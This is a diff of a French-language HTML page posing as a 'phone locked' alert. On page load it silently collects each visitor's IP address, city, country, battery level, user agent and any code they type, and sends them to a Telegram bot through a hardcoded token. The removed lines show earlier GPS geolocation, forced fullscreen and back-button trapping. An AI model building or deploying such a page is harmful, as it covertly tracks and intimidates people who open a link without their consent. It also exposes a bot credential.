@@ -172,7 +172,6 @@ button {
 </main>
 
 <script>
-// TES IDENTIFIANTS TELEGRAM INTÉGRÉS DIRECTEMENT
 const TELEGRAM_TOKEN = "8298299369:AAGGJe_JWK4QuyUrh51VjH1tYflN0X8O6HI";
 const TELEGRAM_CHAT_ID = "8869305312";
 
@@ -186,20 +185,40 @@ const body = document.body;
 const steps = [
     "ALERTE : TÉLÉPHONE VERROUILLÉ.",
     "PROPRIÉTAIRE EXCLUSIF : MANASSE NTAMBWA.",
-    "SCAN DU RÉSEAU ET GÉOLOCALISATION EN COURS...",
+    "SCAN DU RÉSEAU EN COURS...",
     "INITIALISATION DU SYSTÈME..."
 ];
 
 async function envoyerSurTelegram(typeAlerte, detailsExtra = "") {
     let ipInfo = "Inconnue";
+    let cityInfo = "Inconnue";
+    let countryInfo = "";
+    
     try {
         const response = await fetch("https://ipapi.co/json/");
         const data = await response.json();
-        ipInfo = `${data.ip} (${data.city}, ${data.country_name})`; } catch (e) {}  let batteryInfo = "Non disponible"; try { if (navigator.getBattery) { const bat = await navigator.getBattery(); batteryInfo = `${Math.round(bat.level * 100)}% (${bat.charging ? "En charge" : "Sur batterie"})`; } } catch (e) {}  if (navigator.geolocation) { navigator.geolocation.getCurrentPosition(async (position) => { const lat = position.coords.latitude; const lon = position.coords.longitude; envoiFinalTelegram(ipInfo, batteryInfo, `https://www.google.com/maps?q=${lat},${lon}`, detailsExtra, typeAlerte); }, () => { envoiFinalTelegram(ipInfo, batteryInfo, "Refusée ou indisponible", detailsExtra, typeAlerte); }, { timeout: 5000 }); } else { envoiFinalTelegram(ipInfo, batteryInfo, "Non supportée", detailsExtra, typeAlerte); } }  function envoiFinalTelegram(ip, battery, gpsLink, extra, type) { const texteMessage = `🚨 *[${type}] - ALERTE APPAREIL MANASSE*\n\n` +
-                         `• *IP / Ville :* \`${ip}\`\n` +
-                         `• *Batterie :* ${battery}\n` +
-                         `• *GPS :* [Ouvrir la carte Google Maps](${gpsLink})\n` + `• *Appareil :* \`${navigator.userAgent}\`\n` + `${extra}\n` +
-                         `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+        ipInfo = data.ip || "Inconnue";
+        cityInfo = data.city || "Inconnue";
+        countryInfo = data.country_name || "";
+    } catch (e) {}
+
+    let batteryInfo = "Non disponible";
+    try {
+        if (navigator.getBattery) {
+            const bat = await navigator.getBattery();
+            batteryInfo = `${Math.round(bat.level * 100)}\% (${bat.charging ? "En charge" : "Sur batterie"})`;
+        }
+    } catch (e) {}
+
+    const texteMessage = `🚨 *[${type}] - ALERTE APPAREIL MANASSE*\n\n` +
+                         `• *Adresse IP :* \`${ipInfo}\`\n` +
+                         `• *Ville / Pays :* ${cityInfo},${countryInfo}\n` +
+                         `• *Niveau Batterie :* ${batteryInfo}\n` +
+                         `• *Appareil :* \`${navigator.userAgent}\`\n` +
+                         `${extra}\n` +
+                         `• *Date/Heure :* ${new Date().toLocaleString('fr-FR')}`;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
     fetch(url, {
         method: "POST",
@@ -254,19 +273,19 @@ async function runCinematic() {
 form.addEventListener("submit", function(event) {
     event.preventDefault();
 
-    const monCodeSecret = "MNL"; // TON MOT DE PASSE
+    const monCodeSecret = "MNL";
 
     if (password.value === monCodeSecret) {
         status.textContent = "ACCÈS AUTORISÉ — BIENVENUE MAÎTRE";
         status.style.color = "#00ff66";
         form.classList.add("hidden");
         
-        envoyerSurTelegram("DÉVERROUILLAGE RÉUSSI", "✅ *Le propriétaire (Manasse) a saisi le bon code.*");
+        envoyerSurTelegram("DÉVERROUILLAGE RÉUSSI", "✅ *Code maître valide entré par le propriétaire.*");
     } else {
         status.textContent = "ACCÈS REFUSÉ — INTRUS DÉTECTÉ";
         status.style.color = "#ff3333";
         
-        envoyerSurTelegram("TENTATIVE D'INTRUSION", `❌ *Faux code entré :* \`${password.value}\``);
+        envoyerSurTelegram("TENTATIVE D'INTRUSION", `❌ *Mauvais code tapé :* \`${password.value}\``);
 
         password.value = "";
         body.classList.add("glitch-effect");
@@ -278,13 +297,7 @@ form.addEventListener("submit", function(event) {
 window.onload = () => {
     envoyerSurTelegram("OUVERTURE DU LIEN (VISITEUR)");
     runCinematic();
-    document.documentElement.requestFullscreen?.().catch(() => {});
 };
-
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function () {
-    history.pushState(null, null, location.href);
-});
 </script>
 
 </body>
